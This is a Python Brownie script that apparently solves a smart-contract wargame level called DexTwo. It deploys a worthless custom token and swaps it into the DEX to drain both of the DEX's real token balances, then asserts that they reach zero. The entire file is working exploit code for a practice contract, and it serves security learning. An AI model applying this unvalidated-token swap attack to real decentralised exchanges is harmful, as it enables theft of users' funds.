#!/usr/bin/python3
from brownie import DexTwo, JaduToken
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account
from colorama import Fore

# sepolia: 0x6D17f61128b257Cb26cF4B967a15B1cC7e406E5F
# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def attack(contract_address=None, attacker=None):
    if not contract_address:
        dextwo, owner, TKN1, TKN2 = deploy()
        contract_address = dextwo.address
        _, attacker = get_account()
        # transfer 10 of each token to attacker

        TKN1.transfer(attacker, 10, {"from": owner})
        TKN2.transfer(attacker, 10, {"from": owner})

        # print(TKN1.balanceOf(attacker))
        # print(TKN2.balanceOf(attacker))
    else:
        dextwo = DexTwo.at(contract_address)
        attacker = get_account()
        # if attacker is None:
        #     attacker = accounts[1]
        TKN1 = "0xE25c46907bD6F836F156dE616EA729B2D360041F"
        TKN2 = "0x38209699C2E3b85196F477Af9351f3826a4a5c4C"

        # print(dextwo.balanceOf(TKN1, attacker))
        # print(dextwo.balanceOf(TKN2, attacker))

        # print(dextwo.balanceOf(TKN1, dextwo.address))

    dextwo.approve(dextwo.address, 1000, {"from": attacker}).wait(1)

    # deploy & mint Jadu token
    jdu = JaduToken.deploy(1000, {"from": attacker})

    # transfer Jadu token to the dex
    jdu.transfer(dextwo.address, 100, {"from": attacker}).wait(1)

    jdu.approve(dextwo.address, 1000, {"from": attacker}).wait(1)

    dextwo.swap(jdu, TKN1, 100, {"from": attacker}).wait(1)
    # as the value now become 2:1 i.e. the dex has 200 JDU & 100 TKN2
    dextwo.swap(jdu, TKN2, 200, {"from": attacker}).wait(1)

    print(
        f"{green}T1 balance in Dex: {red}",
        dextwo.balanceOf(TKN1, dextwo.address),
        reset,
    )
    print(
        f"{green}T2 balance in Dex: {red}",
        dextwo.balanceOf(TKN2, dextwo.address),
        reset,
    )

    print(
        f"{green}Jadu balance in Dex: {red}",
        dextwo.balanceOf(jdu, dextwo.address),
        reset,
    )

    assert (
        dextwo.balanceOf(TKN1, dextwo.address) == 0
        and dextwo.balanceOf(TKN2, dextwo.address) == 0
    )


def main(contract_address=None, attacker=None):
    if contract_address:
        attack(contract_address, get_account())
    else:
        attack()


if __name__ == "__main__":
    main()
